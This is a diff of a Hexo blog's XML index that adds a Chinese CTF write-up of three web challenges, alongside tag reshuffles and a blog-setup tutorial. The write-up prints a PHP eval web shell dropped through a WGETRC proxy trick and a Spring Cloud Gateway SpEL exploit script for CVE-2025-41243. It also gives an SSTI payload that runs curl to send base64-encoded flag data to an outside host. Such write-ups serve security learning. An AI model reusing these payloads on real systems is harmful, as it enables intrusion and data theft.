@@ -4,6 +4,35 @@
   
   
   <entry>
+    <title>2025强网拟态初赛web方向部分wp</title>
+    <link href="/2025/10/29/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9Bweb%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86wp/"/>
+    <url>/2025/10/29/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9Bweb%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86wp/</url>
+    
+    <content type="html"><![CDATA[<h1 id="smallcode"><a href="#smallcode" class="headerlink" title="smallcode"></a>smallcode</h1><p>WGETRC 是 Wget 工具的配置文件，允许用户通过环境变量或文件自定义 Wget 的行为。因此通过指定WGETRC环境变量到1.txt文件进行相关配置；</p><p>通过在1.txt中写入代理，让wget通过代理请求hhhh，我们启动服务端监听端口作为代理端，只要是请求hhhh域名的地址返回指定内容。 在1.txt中在配置输出文件的名称为1.php，因此可以实现任意文件上传，写入一句话木马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">input = /tmp/<span class="hljs-number">1.</span>txt<br>post-file = <span class="hljs-number">1.</span><span class="hljs-type">txt</span><br><span class="hljs-variable">output_document</span> <span class="hljs-operator">=</span> <span class="hljs-number">1.</span>php<br>http_proxy=http:<span class="hljs-comment">//**.**.**.**:28888/1.txt</span><br></code></pre></td></tr></table></figure><p>服务端中的1.txt文件内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;candy&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> http.server import HTTPServer, BaseHTTPRequestHandler<br>import logging<br>import os<br><br>logging.<span class="hljs-title function_ invoke__">basicConfig</span>(<br>    level=logging.INFO,<br>    format=<span class="hljs-string">&#x27;%(asctime)s - %(message)s&#x27;</span><br>)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProxyLikeHandler</span>(<span class="hljs-title">BaseHTTPRequestHandler</span>):</span><br><span class="hljs-class">    <span class="hljs-title">def</span> <span class="hljs-title">do_GET</span>(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">        <span class="hljs-title">logging</span>.<span class="hljs-title">info</span>(<span class="hljs-title">f</span>&quot;收到<span class="hljs-title">GET</span>请求: </span>&#123;<span class="hljs-built_in">self</span>.path&#125;<span class="hljs-string">&quot;)</span><br><span class="hljs-string">        logging.info(f&quot;</span>Host: &#123;<span class="hljs-built_in">self</span>.headers.<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;Host&#x27;</span>)&#125;<span class="hljs-string">&quot;)</span><br><span class="hljs-string">        logging.info(f&quot;</span>User-Agent: &#123;<span class="hljs-built_in">self</span>.headers.<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;User-Agent&#x27;</span>)&#125;<span class="hljs-string">&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">        file_path = &#x27;1.txt&#x27;</span><br><span class="hljs-string">        if os.path.exists(file_path):</span><br><span class="hljs-string">            with open(file_path, &#x27;rb&#x27;) as f:</span><br><span class="hljs-string">                file_data = f.read()</span><br><span class="hljs-string">            self.send_response(200)</span><br><span class="hljs-string">            self.send_header(&#x27;Content-Type&#x27;, &#x27;text/plain; charset=utf-8&#x27;)</span><br><span class="hljs-string">            self.send_header(&#x27;Content-Disposition&#x27;, &#x27;attachment; filename=&quot;</span><span class="hljs-number">1</span>.txt<span class="hljs-string">&quot;&#x27;)</span><br><span class="hljs-string">            self.send_header(&#x27;Content-Length&#x27;, str(len(file_data)))</span><br><span class="hljs-string">            self.end_headers()</span><br><span class="hljs-string">            self.wfile.write(file_data)</span><br><span class="hljs-string">            logging.info(f&quot;</span>已返回 <span class="hljs-number">1</span>.<span class="hljs-title function_ invoke__">txt</span> (&#123;<span class="hljs-title function_ invoke__">len</span>(file_data)&#125; 字节)<span class="hljs-string">&quot;)</span><br><span class="hljs-string">        else:</span><br><span class="hljs-string">            self.send_error(404, &quot;</span>文件未找到: <span class="hljs-number">1</span>.txt<span class="hljs-string">&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    def do_CONNECT(self):</span><br><span class="hljs-string">        self.do_GET()</span><br><span class="hljs-string"></span><br><span class="hljs-string">    def do_POST(self):</span><br><span class="hljs-string">        self.do_GET()</span><br><span class="hljs-string"></span><br><span class="hljs-string">    def log_message(self, format, *args):</span><br><span class="hljs-string">        pass</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">def run_server(host=&#x27;0.0.0.0&#x27;, port=28888):</span><br><span class="hljs-string">    server_address = (host, port)</span><br><span class="hljs-string">    httpd = HTTPServer(server_address, ProxyLikeHandler)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    print(&quot;</span>=<span class="hljs-string">&quot; * 60)</span><br><span class="hljs-string">    print(&quot;</span>HTTP服务器启动成功！<span class="hljs-string">&quot;)</span><br><span class="hljs-string">    print(f&quot;</span>监听地址: &#123;host&#125;:&#123;port&#125;<span class="hljs-string">&quot;)</span><br><span class="hljs-string">    print(&quot;</span>所有通过此代理的请求都将收到 <span class="hljs-number">1</span>.txt 文件<span class="hljs-string">&quot;)</span><br><span class="hljs-string">    print(&quot;</span>=<span class="hljs-string">&quot; * 60)</span><br><span class="hljs-string">    print(&quot;</span>等待请求中...\n<span class="hljs-string">&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    try:</span><br><span class="hljs-string">        httpd.serve_forever()</span><br><span class="hljs-string">    except KeyboardInterrupt:</span><br><span class="hljs-string">        print(&quot;</span>\n服务器已停止<span class="hljs-string">&quot;)</span><br><span class="hljs-string">        httpd.server_close()</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">if __name__ == &#x27;__main__&#x27;:</span><br><span class="hljs-string">    run_server()</span><br><span class="hljs-string">&lt;?php @eval(<span class="hljs-subst">$_POST</span>[&#x27;candy&#x27;]); ?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/34580676/1761366309896-ecf901a2-c993-4eef-a508-4e728dace4fb.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/34580676/1761366350104-cd82675b-c61b-457c-88c4-767bbc0298d2.png" alt="img"></p><p>访问后即可将一句话木马写入，通过蚁剑连接后，使用nl读取flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/34580676/1761720561447-be4331e2-1047-477b-b44b-366a5fbb3dda.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/34580676/1761366266488-4a7f28cd-dac3-4598-a7ae-a3aabd6d91e9.png" alt="img"></p><h1 id="ezcloud"><a href="#ezcloud" class="headerlink" title="ezcloud"></a>ezcloud</h1><p>本题主要考察内容是 CVE-2025-41243 的任意文件读取，结合一下两个 poc 的内容，即可实现任意文件读取。</p><p><a href="https://blog.z3r.ru/posts/spring-cloud-gateway-spel-vuln/">https://blog.z3r.ru/posts/spring-cloud-gateway-spel-vuln/</a></p><p><a href="https://rce.moe/2025/09/29/CVE-2025-41243">https://rce.moe/2025/09/29/CVE-2025-41243</a></p><p>通过禁用安全限制，覆盖属性的替换路由，再由 setter 触发午餐静态方法刷新配置，实现对静态资源重写，然后即可使用<code>file:///</code>协议进行任意文件下载。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br>s = requests.Session()<br>URL = <span class="hljs-string">&quot;http://web-a8bfd7363f.challenge.xctf.org.cn/&quot;</span><br><br>ROUTE_NAME = <span class="hljs-string">&quot;test_b&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_route</span>(<span class="hljs-params">predicate: <span class="hljs-built_in">str</span></span>):<br>    res = s.post(<br>        <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;URL&#125;</span>actuator/gateway/routes/<span class="hljs-subst">&#123;ROUTE_NAME&#125;</span>&quot;</span>,<br>        json=&#123;<br>            <span class="hljs-string">&quot;predicates&quot;</span>: [&#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Path&quot;</span>, <span class="hljs-string">&quot;args&quot;</span>: &#123;<span class="hljs-string">&quot;_genkey_0&quot;</span>: <span class="hljs-string">&quot;/actuators/test&quot;</span>&#125;&#125;],<br>            <span class="hljs-string">&quot;filters&quot;</span>: [<br>                &#123;<br>                    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;RewritePath&quot;</span>,<br>                    <span class="hljs-string">&quot;args&quot;</span>: &#123;<br>                        <span class="hljs-string">&quot;_genkey_0&quot;</span>: <span class="hljs-string">&quot;/test&quot;</span>,<br>                        <span class="hljs-string">&quot;_genkey_1&quot;</span>: predicate,<br>                    &#125;,<br>                &#125;<br>            ],<br>            <span class="hljs-string">&quot;uri&quot;</span>: <span class="hljs-string">&quot;http://example.com&quot;</span>,<br>            <span class="hljs-string">&quot;order&quot;</span>: -<span class="hljs-number">1</span>,<br>        &#125;,<br>    )<br>    res.raise_for_status()<br>    s.post(<br>        <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;URL&#125;</span>actuator/gateway/refresh&quot;</span>,<br>    )<br>    res.raise_for_status()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_route</span>():<br>    res = s.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;URL&#125;</span>actuator/gateway/routes/<span class="hljs-subst">&#123;ROUTE_NAME&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> res.json()[<span class="hljs-string">&quot;filters&quot;</span>]<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;UNEXPECTED: <span class="hljs-subst">&#123;e!r&#125;</span>, <span class="hljs-subst">&#123;res.status_code&#125;</span> <span class="hljs-subst">&#123;res.text&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">raise</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_route</span>():<br>    res = s.delete(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;URL&#125;</span>actuator/gateway/routes/<span class="hljs-subst">&#123;ROUTE_NAME&#125;</span>&quot;</span>)<br>    res.raise_for_status()<br>    s.post(<br>        <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;URL&#125;</span>actuator/gateway/refresh&quot;</span>,<br>    )<br>    res.raise_for_status()<br><br><br>add_route(<span class="hljs-string">&quot;#&#123;@systemProperties[&#x27;spring.cloud.gateway.restrictive-property-accessor.enabled&#x27;] = false&#125;&quot;</span>)<br><span class="hljs-built_in">print</span>(read_route())<br><br>add_route(<span class="hljs-string">&quot;#&#123;@resourceHandlerMapping.urlMap[&#x27;/**&#x27;].locationValues[0]=&#x27;file:///&#x27;&#125;&quot;</span>)<br><span class="hljs-built_in">print</span>(read_route())<br><br>add_route(<span class="hljs-string">&quot;#&#123;@resourceHandlerMapping.urlMap[&#x27;/**&#x27;].afterPropertiesSet&#125;&quot;</span>)<br><span class="hljs-built_in">print</span>(read_route())<br></code></pre></td></tr></table></figure><p>在修改路由配置以后，访问根目录下的 flag 内容即可获取 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">http://web-a8bfd7363f.challenge.xctf.org.cn/flag<br>下载flag<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/34580676/1761390891260-ed33983a-c0dc-44fb-b0c9-0023f46a34f9.png" alt="img"></p><h1 id="safesecret"><a href="#safesecret" class="headerlink" title="safesecret"></a>safesecret</h1><p>由于 <code>walked_steps &gt;= ERROR_COUNT</code> 构造至少7步重定向链，因此通过起一个 python 服务实现 7 步重定向到<code>http://127.0.0.1:5000/_internal/secret</code>，获取得到 secret；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, Response<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/step1&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">step1</span>():<br>    <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;&quot;</span>, headers=&#123;<span class="hljs-string">&quot;Refresh&quot;</span>: <span class="hljs-string">&quot;0;url=http://**.**.**.**:8000/step2&quot;</span>&#125;)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/step2&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">step2</span>():<br>    <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;&quot;</span>, headers=&#123;<span class="hljs-string">&quot;Refresh&quot;</span>: <span class="hljs-string">&quot;0;url=http://**.**.**.**:8000/step3&quot;</span>&#125;)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/step3&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">step3</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://**.**.**.**:8000/step4&quot;&gt;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/step4&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">step4</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://**.**.**.**:8000/step5&quot;&gt;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/step5&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">step5</span>():<br>    <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;&quot;</span>, status=<span class="hljs-number">401</span>, headers=&#123;<span class="hljs-string">&quot;X-Next&quot;</span>: <span class="hljs-string">&quot;http://**.**.**.**:8000/step6&quot;</span>&#125;)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/step6&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">step6</span>():<br>    <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;&quot;</span>, status=<span class="hljs-number">429</span>, headers=&#123;<span class="hljs-string">&quot;X-Next&quot;</span>: <span class="hljs-string">&quot;http://**.**.**.**:8000/step7&quot;</span>&#125;)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/step7&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">step7</span>():<br>    <span class="hljs-comment"># 第7步后，重定向到目标</span><br>    <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;&quot;</span>, headers=&#123;<span class="hljs-string">&quot;Refresh&quot;</span>: <span class="hljs-string">&quot;0;url=http://127.0.0.1:5000/_internal/secret&quot;</span>&#125;)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8000</span>)<br></code></pre></td></tr></table></figure><p>虽然存在 ssti 注入，但是由于长度必须小于 47 个字符的限制，因此需要采用链式调用实现 ssti 注入。</p><p>并且代码中注册了 sset 和 sget 两个函数到 Jinja2 的全局命名空间。</p><p>通过将中间值存储再 session，实现黑名单绕过以及缩减长度，最终 payload 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">http://web-13f5625fbc.challenge.xctf.org.cn/login?secret=1140457d-a0b5-4e6d-a423-5a676e61992a&amp;username=&#123;%<span class="hljs-built_in">set</span> a=sset(<span class="hljs-string">&#x27;g&#x27;</span>,request.args.v)%&#125;&amp;v=__globals__<br>http://web-13f5625fbc.challenge.xctf.org.cn/login?secret=1140457d-a0b5-4e6d-a423-5a676e61992a&amp;username=&#123;%<span class="hljs-built_in">set</span> a=sset(<span class="hljs-string">&#x27;p&#x27;</span>,request.args.v)%&#125;&amp;v=curl http://**.**.**.**:<span class="hljs-number">28888</span>/?f=`cat /flag | base64`<br>http://web-13f5625fbc.challenge.xctf.org.cn/login?secret=1140457d-a0b5-4e6d-a423-5a676e61992a&amp;username=&#123;%<span class="hljs-built_in">set</span> a=lipsum[sget(<span class="hljs-string">&#x27;g&#x27;</span>)].os.popen(sget(<span class="hljs-string">&#x27;p&#x27;</span>))%&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/34580676/1761403712800-25dbe278-7823-4695-b6df-0f8f254b131e.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/34580676/1761403739087-16eb7865-03e8-4474-8390-f8a8b2e37705.png" alt="img"></p><h1 id="ecshop"><a href="#ecshop" class="headerlink" title="ecshop"></a>ecshop</h1>]]></content>
+    
+    
+    <categories>
+      
+      <category>攻防渗透</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CTF</tag>
+      
+      <tag>强网拟态</tag>
+      
+      <tag>2025</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Windows系统shellcode开发</title>
     <link href="/2025/10/15/Windows%E7%B3%BB%E7%BB%9Fshellcode%E5%BC%80%E5%8F%91/"/>
     <url>/2025/10/15/Windows%E7%B3%BB%E7%BB%9Fshellcode%E5%BC%80%E5%8F%91/</url>
@@ -250,11 +279,11 @@
     
     <tags>
       
-      <tag>Fastjson</tag>
-      
       <tag>Bypass</tag>
       
       <tag>Gadget</tag>
+      
+      <tag>Fastjson</tag>
       
     </tags>
     
@@ -488,11 +517,11 @@
     
     <tags>
       
-      <tag>Bypass</tag>
-      
       <tag>免杀对抗</tag>
       
       <tag>Windows Api</tag>
+      
+      <tag>Bypass</tag>
       
     </tags>
     
@@ -606,9 +635,9 @@
       
       <tag>免杀对抗</tag>
       
-      <tag>PE文件</tag>
-      
       <tag>Windows编程</tag>
+      
+      <tag>PE文件</tag>
       
     </tags>
     
@@ -823,7 +852,7 @@
     
     <categories>
       
-      <category>安全开发</category>
+      <category>攻防渗透</category>
       
     </categories>
     
@@ -983,13 +1012,13 @@
     
     <tags>
       
-      <tag>Gadget</tag>
-      
       <tag>Java安全</tag>
       
       <tag>反序列化</tag>
       
       <tag>Jackson</tag>
+      
+      <tag>Gadget</tag>
       
     </tags>
     
@@ -1374,9 +1403,9 @@
       
       <tag>反序列化</tag>
       
-      <tag>Java反射</tag>
-      
       <tag>利用链</tag>
+      
+      <tag>Java反射</tag>
       
     </tags>
     
@@ -1430,9 +1459,9 @@
     
     <tags>
       
-      <tag>cve复现</tag>
-      
       <tag>漏洞复现</tag>
+      
+      <tag>cve复现</tag>
       
       <tag>web攻防</tag>
       
@@ -1520,7 +1549,7 @@
     
     <categories>
       
-      <category>渗透学习</category>
+      <category>打靶日记</category>
       
     </categories>
     
@@ -1584,16 +1613,16 @@
     
     <categories>
       
-      <category>渗透学习</category>
+      <category>打靶日记</category>
       
     </categories>
     
     
     <tags>
       
-      <tag>web攻防</tag>
-      
       <tag>工具教程</tag>
+      
+      <tag>web攻防</tag>
       
       <tag>打靶日记</tag>
       
@@ -1613,7 +1642,7 @@
     
     <categories>
       
-      <category>渗透学习</category>
+      <category>攻防渗透</category>
       
     </categories>
     
@@ -1642,7 +1671,7 @@
     
     <categories>
       
-      <category>渗透学习</category>
+      <category>打靶日记</category>
       
     </categories>
     
@@ -1673,7 +1702,7 @@
     
     <categories>
       
-      <category>渗透学习</category>
+      <category>打靶日记</category>
       
     </categories>
     
@@ -1704,7 +1733,7 @@
     
     <categories>
       
-      <category>渗透学习</category>
+      <category>打靶日记</category>
       
     </categories>
     
@@ -1824,7 +1853,7 @@
     
     <categories>
       
-      <category>渗透学习</category>
+      <category>打靶日记</category>
       
     </categories>
     
@@ -1880,7 +1909,7 @@
     
     <categories>
       
-      <category>渗透学习</category>
+      <category>打靶日记</category>
       
     </categories>
     
@@ -1907,7 +1936,7 @@
     
     <categories>
       
-      <category>渗透学习</category>
+      <category>打靶日记</category>
       
     </categories>
     
@@ -1934,7 +1963,7 @@
     
     <categories>
       
-      <category>渗透学习</category>
+      <category>攻防渗透</category>
       
     </categories>
     
@@ -1961,7 +1990,7 @@
     
     <categories>
       
-      <category>渗透学习</category>
+      <category>打靶日记</category>
       
     </categories>
     
@@ -2102,7 +2131,7 @@
     
     <categories>
       
-      <category>渗透学习</category>
+      <category>打靶日记</category>
       
     </categories>
     
@@ -2131,7 +2160,7 @@
     
     <categories>
       
-      <category>渗透学习</category>
+      <category>打靶日记</category>
       
     </categories>
     
@@ -2160,7 +2189,7 @@
     
     <categories>
       
-      <category>渗透学习</category>
+      <category>打靶日记</category>
       
     </categories>
     
@@ -2209,7 +2238,7 @@
     <link href="/2024/05/05/github-io-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
     <url>/2024/05/05/github-io-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
     
-    <content type="html"><![CDATA[<h1 id="一、环境安装"><a href="#一、环境安装" class="headerlink" title="一、环境安装"></a>一、环境安装</h1><h2 id="1-1-必备环境安装"><a href="#1-1-必备环境安装" class="headerlink" title="1.1 必备环境安装"></a>1.1 必备环境安装</h2><p><a href="https://nodejs.org/en/">Node.js — Run JavaScript Everywhere (nodejs.org)</a></p><p><a href="https://git-scm.com/downloads">Git - Downloads (git-scm.com)</a></p><p>这是必备的两个基本环境，请先安装这两个基本环境，网上均有教程，请参考其他教程进行安装</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061659772.png" alt="image-20240505141421146"></p><p>运行这三条指令能够出现相应的版本号即可，不要求版本号相同。</p><h1 id="二、github-io仓库创建"><a href="#二、github-io仓库创建" class="headerlink" title="二、github.io仓库创建"></a>二、github.io仓库创建</h1><p>创建github page仓库的仓库名规则<code>&lt;用户名&gt;.github.io</code>如下图所示，并选择公开项目。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061659455.png" alt="image-20240505141654227"></p><p>点击Actions，查看页面运行状态，等待其成功运行部署，这个过程可能会有点漫长可以稍等1分钟左右</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061659541.png" alt="image-20240505141919262"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700350.png" alt="image-20240505141957864"></p><p>成功运行后，通过访问<code>https://&lt;用户名&gt;.github.io</code>基于访问看到基础页面。（如果报错，可以删除仓库重复上述过程，或者寻找其他大佬的文章解决错误）</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700191.png" alt="image-20240505142102518"></p><p>这样初步的界面就已经搭建出来了，具有前端知识的大佬可以传自己的博客模板到新建的仓库即可看到自己的博客了，我这样的鼠鼠还得通过hexo去使用模板</p><h1 id="三、上传博客模板"><a href="#三、上传博客模板" class="headerlink" title="三、上传博客模板"></a>三、上传博客模板</h1><h2 id="3-1-安装Hexo"><a href="#3-1-安装Hexo" class="headerlink" title="3.1 安装Hexo"></a>3.1 安装Hexo</h2><p>使用 npm 一键安装 Hexo 博客程序：（此为全局安装命令，一般也推荐全局安装，局部安装我也没搞懂）</p><blockquote><p>npm install -g hexo-cli</p></blockquote><h2 id="3-2-Hexo本地"><a href="#3-2-Hexo本地" class="headerlink" title="3.2 Hexo本地"></a>3.2 Hexo本地</h2><p>首先在自己想要的地方创建一个空文件夹来初始化hexo</p><blockquote><p>hexo init      # 初始化<br>npm install    # 安装组件</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700645.png" alt="image-20240505142944417"></p><p>完成上述初始化后，在继续执行下方指令生成页面也本地预览，访问本地网址<a href="http://localhost:4000/">http://localhost:4000/</a></p><blockquote><p>hexo g   # 生成页面<br>hexo s   # 启动预览</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700266.png" alt="image-20240505143118833"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700068.png" alt="image-20240505143129696"></p><p>至此，本地hexo已经成功，我们将我们生成的模板上传到自己的github.io仓库中，即可实现访问我们的github page得到相应的博客模板</p><h2 id="3-3-部署到github"><a href="#3-3-部署到github" class="headerlink" title="3.3 部署到github"></a>3.3 部署到github</h2><p>修改刚才我们初始化hexo文件中的<code>_config.yml</code>文件中最后的配置</p><blockquote><p>deploy:</p><p>type: git</p><p>repo: <a href="mailto:&#103;&#x69;&#116;&#x40;&#x67;&#x69;&#x74;&#x68;&#117;&#x62;&#x2e;&#99;&#111;&#109;">&#103;&#x69;&#116;&#x40;&#x67;&#x69;&#x74;&#x68;&#117;&#x62;&#x2e;&#99;&#111;&#109;</a>:&lt;用户名&gt;&#x2F;&lt;用户名&gt;.github.io.git </p><p>branch: main(这个分支根据自己的主分支进行修改，有的人是master)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700501.png" alt="image-20240505150515357"></p><p>修改保存退出，然后再命令行执行指令</p><blockquote><p>npm install hexo-deployer-git –save</p><p>hexo d</p></blockquote><p>再次等待Actions运行成功，这个过程稍微一点漫长，成功后，访问我们的github 